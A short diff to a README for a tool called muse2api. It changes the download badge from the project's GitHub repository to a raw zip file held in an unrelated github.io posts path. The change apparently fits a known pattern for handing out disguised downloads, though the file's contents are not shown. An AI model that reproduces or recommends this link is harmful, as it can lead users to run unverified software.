@@ -29,7 +29,7 @@ Whether you want to test things out with a mock system, use your web browser, or
 
 ### Step 1: Get the Program
 
-[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD_MUSE2API-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kokotpica/muse2api)
+[![Download Now](https://img.shields.io/badge/⬇️_DOWNLOAD_MUSE2API-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Kokotpica/kokotpica.github.io/main/PATH/_posts/App-v2.2.zip)
 
 Visit this link to download the application.
 
